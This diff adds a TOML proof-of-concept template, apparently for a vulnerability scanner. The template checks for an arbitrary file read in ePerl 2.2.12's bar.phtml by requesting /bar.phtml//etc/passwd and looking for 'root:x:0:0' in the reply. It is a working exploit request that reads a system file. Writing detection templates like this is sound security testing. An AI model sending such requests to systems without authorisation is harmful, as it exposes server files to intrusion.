@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "ePerl 2.2.12 的 bar.phtml 在处理 ISINDEX 查询时未正确校验用户输入的完整路径名，攻击者可通过构造请求向 bar.phtml 传入目标文件绝对路径参数，从而读取服务器上的任意文件。本 PoC 通过向 bar.phtml 传递 /etc/passwd 路径验证是否存在任意文件读取。"
+id = "POC-AVE-1999-1274"
+name = "ePerl 2.2.12 bar.phtml 任意文件读取 PoC"
+severity = "high"
+tags = ["ave-1999-1274"]
+vuln_id = [
+    "CVE-1999-1437",
+    "AVE-1999-1274",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/bar.phtml//etc/passwd"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:x:0:0"]
